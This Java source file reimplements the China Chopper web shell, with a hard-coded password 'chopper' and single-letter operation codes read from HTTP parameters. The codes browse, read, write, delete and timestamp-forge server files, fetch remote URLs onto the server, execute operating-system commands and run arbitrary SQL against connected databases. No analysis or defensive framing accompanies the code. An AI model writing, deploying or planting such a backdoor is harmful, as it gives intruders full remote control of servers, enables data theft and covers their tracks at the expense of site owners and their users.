
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;

import javax.servlet.ServletContext;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Main {
	String Pwd = "chopper";
	
	String ConvertCharset(String s, String c) throws Exception {
		return s;
	}//new String(s.getBytes("ISO-8859-1"),c);}

	Connection GC(String s) throws Exception {
		String[] x = s.trim().split("\r\n");
		Class.forName(x[0].trim()).newInstance();
		Connection c = DriverManager.getConnection(x[1].trim());
		if (x.length > 2) {
			c.setCatalog(x[2].trim());
		}
		return c;
	}

	void listDisks(StringBuffer sb) throws Exception {
		File r[] = File.listRoots();
		for (int i = 0; i < r.length; i++) {
			sb.append(r[i].toString().substring(0, 2));
		}
	}

	void listDir(String path, StringBuffer sb) throws Exception {
		File oF = new File(path), l[] = oF.listFiles();
		String sT, sQ, sF = "";
		java.util.Date dt;
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		for (int i = 0; i < l.length; i++) {
			dt = new java.util.Date(l[i].lastModified());
			sT = fm.format(dt);
			sQ = l[i].canRead() ? "R" : "";
			sQ += l[i].canWrite() ? " W" : "";
			if (l[i].isDirectory()) {
				sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()
						+ "\t" + sQ + "\n");
			} else {
				sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"
						+ sQ + "\n";
			}
		}
		sb.append(sF);
	}

	void deleteDir(String s) throws Exception {
		File f = new File(s);
		if (f.isDirectory()) {
			File x[] = f.listFiles();
			for (int k = 0; k < x.length; k++) {
				if (!x[k].delete()) {
					deleteDir(x[k].getPath());
				}
			}
		}
		f.delete();
	}

	void responseFileData(String s, HttpServletResponse r) throws Exception {
		int n;
		byte[] b = new byte[512];
		r.reset();
		ServletOutputStream os = r.getOutputStream();
		BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
		os.write(("->" + "|").getBytes(), 0, 3);
		while ((n = is.read(b, 0, 512)) != -1) {
			os.write(b, 0, n);
		}
		os.write(("|" + "<-").getBytes(), 0, 3);
		os.close();
		is.close();
	}

	void writeDataToServerPath(String s, String d) throws Exception {
		String h = "0123456789ABCDEF";
		int n;
		File f = new File(s);
		f.createNewFile();
		FileOutputStream os = new FileOutputStream(f);
		for (int i = 0; i < d.length(); i += 2) {
			os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));
		}
		os.close();
	}

	void copyServerFileToServerFile(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		if (sf.isDirectory()) {
			if (!df.exists()) {
				df.mkdir();
			}
			File z[] = sf.listFiles();
			for (int j = 0; j < z.length; j++) {
				copyServerFileToServerFile(s + "/" + z[j].getName(), d + "/" + z[j].getName());
			}
		} else {
			FileInputStream is = new FileInputStream(sf);
			FileOutputStream os = new FileOutputStream(df);
			int n;
			byte[] b = new byte[512];
			while ((n = is.read(b, 0, 512)) != -1) {
				os.write(b, 0, n);
			}
			is.close();
			os.close();
		}
	}

	void renameServerFile(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		sf.renameTo(df);
	}

	void mkdirServerDir(String s) throws Exception {
		File f = new File(s);
		f.mkdir();
	}

	void modifyServerFileTime(String s, String t) throws Exception {
		File f = new File(s);
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		java.util.Date dt = fm.parse(t);
		f.setLastModified(dt.getTime());
	}

	void downloadUrlToServerPath(String s, String d) throws Exception {
		URL u = new URL(s);
		int n;
		FileOutputStream os = new FileOutputStream(d);
		HttpURLConnection h = (HttpURLConnection) u.openConnection();
		InputStream is = h.getInputStream();
		byte[] b = new byte[512];
		while ((n = is.read(b, 0, 512)) != -1) {
			os.write(b, 0, n);
		}
		os.close();
		is.close();
		h.disconnect();
	}

	void inputStreamToStringBuffer(InputStream is, StringBuffer sb) throws Exception {
		String l;
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		while ((l = br.readLine()) != null) {
			sb.append(l + "\r\n");
		}
	}

	void getDbCatalogs(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		ResultSet r = c.getMetaData().getCatalogs();
		while (r.next()) {
			sb.append(r.getString(1) + "\t");
		}
		r.close();
		c.close();
	}

	void getDbTables(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		String[] t = { "TABLE" };
		ResultSet r = c.getMetaData().getTables(null, null, "%", t);
		while (r.next()) {
			sb.append(r.getString("TABLE_NAME") + "\t");
		}
		r.close();
		c.close();
	}

	void selectTablesData(String s, StringBuffer sb) throws Exception {
		String[] x = s.trim().split("\r\n");
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1007);
		ResultSet r = m.executeQuery("select * from " + x[3]);
		ResultSetMetaData d = r.getMetaData();
		for (int i = 1; i <= d.getColumnCount(); i++) {
			sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)
					+ ")\t");
		}
		r.close();
		m.close();
		c.close();
	}

	void execSql(String cs, String s, String q, StringBuffer sb) throws Exception {
		int i;
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1008);
		try {
			ResultSet r = m.executeQuery(q);
			ResultSetMetaData d = r.getMetaData();
			int n = d.getColumnCount();
			for (i = 1; i <= n; i++) {
				sb.append(d.getColumnName(i) + "\t|\t");
			}
			sb.append("\r\n");
			while (r.next()) {
				for (i = 1; i <= n; i++) {
					sb.append(ConvertCharset(r.getString(i), cs) + "\t|\t");
				}
				sb.append("\r\n");
			}
			r.close();
		} catch (Exception e) {
			sb.append("Result\t|\t\r\n");
			try {
				m.executeUpdate(q);
				sb.append("Execute Successfully!\t|\t\r\n");
			} catch (Exception ee) {
				sb.append(ee.toString() + "\t|\t\r\n");
			}
		}
		m.close();
		c.close();
	}
	public  void test(String[] args) throws Exception {
		HttpServletRequest request = null;
		HttpServletResponse response = null;
		ServletContext application = null;
		PrintWriter out=response.getWriter(); 
		
		
		
	
		String charsetCode = request.getParameter("z0") + "";
		request.setCharacterEncoding(charsetCode);
		response.setContentType("text/html;charset=" + charsetCode);
		String opCode = ConvertCharset(request.getParameter(Pwd) + "", charsetCode);
		String serverPath = ConvertCharset(request.getParameter("z1") + "", charsetCode);
		String z2 = ConvertCharset(request.getParameter("z2") + "", charsetCode);
		StringBuffer sb = new StringBuffer("");
		try {
			sb.append("->" + "|");
			if (opCode.equals("A")) {//获取磁盘列表
				String s = new File(application.getRealPath(request
						.getRequestURI())).getParent();
				sb.append(s + "\t");
				if (!s.substring(0, 1).equals("/")) {
					listDisks(sb);
				}
			} else if (opCode.equals("B")) {//显示目录列表
				listDir(serverPath, sb);
			} else if (opCode.equals("C")) {//显示文件
				String l = "";
				BufferedReader br = new BufferedReader(
						new InputStreamReader(new FileInputStream(new File(
								serverPath))));
				while ((l = br.readLine()) != null) {
					sb.append(l + "\r\n");
				}
				br.close();
			} else if (opCode.equals("D")) {//下载文件
				BufferedWriter bw = new BufferedWriter(
						new OutputStreamWriter(new FileOutputStream(
								new File(serverPath))));
				bw.write(z2);
				bw.close();
				sb.append("1");
			} else if (opCode.equals("E")) {//删除目录
				deleteDir(serverPath);
				sb.append("1");
			} else if (opCode.equals("F")) {
				responseFileData(serverPath, response);
			} else if (opCode.equals("G")) {
				writeDataToServerPath(serverPath, z2);
				sb.append("1");
			} else if (opCode.equals("H")) {
				copyServerFileToServerFile(serverPath, z2);
				sb.append("1");
			} else if (opCode.equals("I")) {
				renameServerFile(serverPath, z2);
				sb.append("1");
			} else if (opCode.equals("J")) {
				mkdirServerDir(serverPath);
				sb.append("1");
			} else if (opCode.equals("K")) {
				modifyServerFileTime(serverPath, z2);
				sb.append("1");
			} else if (opCode.equals("L")) {
				downloadUrlToServerPath(serverPath, z2);
				sb.append("1");
			} else if (opCode.equals("M")) {
				String[] c = { serverPath.substring(2), serverPath.substring(0, 2), z2 };
				Process p = Runtime.getRuntime().exec(c);
				inputStreamToStringBuffer(p.getInputStream(), sb);
				inputStreamToStringBuffer(p.getErrorStream(), sb);
			} else if (opCode.equals("N")) {
				getDbCatalogs(serverPath, sb);
			} else if (opCode.equals("O")) {
				getDbTables(serverPath, sb);
			} else if (opCode.equals("P")) {
				selectTablesData(serverPath, sb);
			} else if (opCode.equals("Q")) {
				execSql(charsetCode, serverPath, z2, sb);
			}
		} catch (Exception e) {
			sb.append("ERROR" + ":// " + e.toString());
		}
		sb.append("|" + "<-");
		out.print(sb.toString());
		
		
	}
}










